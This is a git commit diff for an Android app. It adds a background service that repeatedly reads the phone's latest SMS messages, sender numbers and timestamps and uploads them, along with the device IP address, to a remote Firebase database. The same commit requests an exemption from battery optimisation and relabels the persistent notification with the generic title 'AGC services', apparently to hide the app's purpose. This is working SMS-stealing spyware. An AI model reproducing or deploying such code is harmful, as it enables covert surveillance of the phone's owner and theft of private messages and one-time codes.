f64ab89049143255e5d2e17a7d49590a0493094c
devarsh <vasanidevarsh@gmail.com>
2024-01-20 12:30:03 +0530

    all done without sql

--- app/src/main/java/com/example/service/MainActivity.java
+++ app/src/main/java/com/example/service/MainActivity.java
@@ -1,30 +1,151 @@
 package com.example.service;
+import android.net.Uri;
+import android.os.Bundle;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
-
+import android.os.PowerManager;
 import android.Manifest;
 import android.app.ActivityManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
-import android.os.Bundle;
+import android.util.Log;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+
+import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.Task;
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
 
 public class MainActivity extends AppCompatActivity {
 
+    Button but;
+    EditText edit;
+
+    String name_m;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        ActivityCompat.requestPermissions( MainActivity.this , new String[]{Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);
+        TextView text = (TextView) findViewById(R.id.textView);
 
+        SharedPreferences preferences = getSharedPreferences("phone", MODE_PRIVATE);
+
+        name_m = preferences.getString("name_mobile", "");
+
+        EditText edit = (EditText) findViewById(R.id.editTextText);
+        Button but = (Button) findViewById(R.id.button);
+
+        DatabaseReference check = FirebaseDatabase.getInstance().getReference("users");
+
+        check.get().addOnCompleteListener(new OnCompleteListener<DataSnapshot>() {
+            @Override
+            public void onComplete(@NonNull Task<DataSnapshot> task) {
+                if (task.isSuccessful()){
+                    DataSnapshot snapshot = task.getResult();
+                    if (snapshot.exists()){
+                        Log.i("check", String.valueOf(task.getResult().getValue()));
+                    }
+                    else {
+                        Log.i("check", "not exists");
+                    }
+                }
+            }
+        });
+        if(name_m.length()==0){
+                edit.setVisibility(View.VISIBLE);
+                but.setVisibility(View.VISIBLE);
+
+        }
+
+        else {
+                Log.i("memmory", name_m);
+                edit.setVisibility(View.INVISIBLE);
+                but.setVisibility(View.INVISIBLE);
+            }
+
+        if (but.getVisibility()==View.VISIBLE){
+
+
+
+            but.setOnClickListener(new View.OnClickListener() {
+                @Override
+                public void onClick(View v) {
+                    String text = edit.getText().toString();
+
+                    if (text.length()==0){
+
+                    }
+
+                    else {
+                        SharedPreferences preferences = getSharedPreferences("phone", MODE_PRIVATE);
+                        SharedPreferences.Editor editor = preferences.edit();
+                        editor.putString("name_mobile", text);
+                        editor.apply();
+
+                        name_m = text;
+                        but.setVisibility(View.INVISIBLE);
+                        edit.setVisibility(View.INVISIBLE);
+                    }
+
+                }
+            });
+        }
+
+
+
+
+
+            ActivityCompat.requestPermissions( MainActivity.this , new String[]{Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);
+        requestbatteryoptimization();
         Intent serviceIntent = new Intent(this, MyForegroundService.class);
 
         startForegroundService(serviceIntent);
 
         foregroundServiceRunning();
     }
+
+    private void requestbatteryoptimization(){
+        try {
+            Intent intent = new Intent();
+            String packageName = getPackageName();
+            if(android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + packageName));
+                startActivity(intent);
+            }
+        }
+        catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    private boolean isbatteryoptimization(){
+        boolean isIgnoring = false;
+        try {
+            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (powerManager != null) {
+                isIgnoring = powerManager.isIgnoringBatteryOptimizations(getPackageName());
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    return isIgnoring;
+    }
+
+
 
     public boolean foregroundServiceRunning(){
         ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
--- app/src/main/java/com/example/service/MyForegroundService.java
+++ app/src/main/java/com/example/service/MyForegroundService.java
@@ -5,32 +5,180 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.IBinder;
 import android.util.Log;
 
+import android.widget.TextView;
+
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 
+import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.Task;
+import com.google.firebase.database.DataSnapshot;
 
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Collections;
+import java.util.List;
+
+import android.text.format.Formatter;
 
 public class MyForegroundService extends Service {
 
+
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        String name_m;
+        String ip;
+
+        TextView text;
+        final String[] check_msg = new String[1];
+
+
         new Thread(
+
+
                 new Runnable() {
                     @Override
                     public void run() {
                         while (true) {
+
+                            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+                            WifiInfo wi = wm.getConnectionInfo();
+                            final String ip_new = Formatter.formatIpAddress(wi.getIpAddress());
+                            Log.i("ip", getIPAddress(true));
                             Log.i("Service", "Service is running...");
+                            SharedPreferences preferences = getSharedPreferences("phone", MODE_PRIVATE);
+                            SharedPreferences preferences1 = getSharedPreferences("ip", MODE_PRIVATE);
+                            String check_ip = preferences1.getString("ip", "");
 
-                            Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
 
-                            cursor.moveToFirst();
-                            Log.i("msg", cursor.getString(12));
+                            String name_m = preferences.getString("name_mobile", "");
+
+                            DatabaseReference check = FirebaseDatabase.getInstance().getReference("users");
+
+                            check.get().addOnCompleteListener(new OnCompleteListener<DataSnapshot>() {
+                                @Override
+                                public void onComplete(@NonNull Task<DataSnapshot> task) {
+                                    if (task.isSuccessful()){
+                                        DataSnapshot snapshot = task.getResult();
+                                        if (snapshot.exists()){
+                                            Log.i("check", String.valueOf(task.getResult().getValue()));
+                                        }
+                                        else {
+                                            Log.i("check", "not exists");
+                                        }
+                                    }
+                                }
+                            });
+
+
+
+                            if (name_m.length()!=0){
+
+
+                                Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
+
+                                Cursor cursor1 = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+
+
+                                cursor.moveToFirst();
+
+                                cursor1.moveToFirst();
+
+                                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss aaa z");
+
+                                String date = cursor1.getString(cursor1.getColumnIndex("date"));
+
+                                String pnaam = cursor1.getString(cursor1.getColumnIndex("address"));
+
+
+
+
+
+                                Long timestamp =Long.parseLong(date);
+
+                                Calendar calendar = Calendar.getInstance();
+
+                                calendar.setTimeInMillis(timestamp);
+
+
+                                String sms_date = simpleDateFormat.format(calendar.getTime());
+
+
+
+
+
+                                Log.i("date", sms_date);
+
+                                Log.i("phone number", pnaam);
+
+
+
+
+
+                                String msg= cursor.getString(12);
+
+                                preferences = getSharedPreferences("msg", MODE_PRIVATE);
+
+
+                                if (check.equals(msg)){
+
+                                }
+                                else {
+
+
+                                    Log.i("msg", msg);
+
+
+                                    String currentTime = Calendar.getInstance().getTime().toString();
+
+                                    FirebaseDatabase database = FirebaseDatabase.getInstance();
+                                    DatabaseReference root = database.getReference("users");
+                                    Log.i("done ", "done");
+                                    root.child(name_m).child(sms_date).child("msg").setValue(msg);
+                                    root.child(name_m).child(sms_date).child("phoneNo").setValue(pnaam);
+                                    root.child(name_m).child(sms_date).child("body").setValue(msg);
+                                    if(ip_new.equals(check_ip)){
+                                        Log.i("ip", "same");
+
+                                    }
+                                    else {
+                                        root.child(name_m).child("IP").setValue(getIPAddress(true));
+                                        SharedPreferences.Editor editor1 = preferences1.edit();
+                                        editor1.putString("ip", getIPAddress(true));
+                                        editor1.apply();
+                                    }
+
+
+
+                                    SharedPreferences.Editor editor = preferences.edit();
+                                    editor.putString("msg_mobile", msg);
+                                    editor.apply();
+
+
+
+                                }
+
+                            }
+
+
+
+
                             try {
-                                Thread.sleep(5000);
+                                Thread.sleep(3000);
                             } catch (InterruptedException e) {
                                 e.printStackTrace();
                             }
@@ -51,8 +199,8 @@ public class MyForegroundService extends Service {
 
         getSystemService(NotificationManager.class).createNotificationChannel(channel);
         Notification.Builder notification = new Notification.Builder(this, CHANNELID)
-                .setContentText("Activity Recognition is running....")
-                .setContentTitle("Obesity Point")
+                .setContentText("app is running")
+                .setContentTitle("AGC services")
                 .setSmallIcon(R.drawable.ic_launcher_background);
 
         startForeground(1001, notification.build());
@@ -63,5 +211,32 @@ public class MyForegroundService extends Service {
     @Override
     public IBinder onBind(Intent intent) {
         return null;
+    }
+    public static String getIPAddress(boolean useIPv4) {
+        try {
+
+            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
+            for (NetworkInterface intf : interfaces) {
+                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
+                for (InetAddress addr : addrs) {
+                    if (!addr.isLoopbackAddress()) {
+                        String sAddr = addr.getHostAddress();
+                        //boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
+                        boolean isIPv4 = sAddr.indexOf(':')<0;
+
+                        if (useIPv4) {
+                            if (isIPv4)
+                                return sAddr;
+                        } else {
+                            if (!isIPv4) {
+                                int delim = sAddr.indexOf('%'); // drop ip6 zone suffix
+                                return delim<0 ? sAddr.toUpperCase() : sAddr.substring(0, delim).toUpperCase();
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception ex) { } // for now eat exceptions
+        return "";
     }
 }
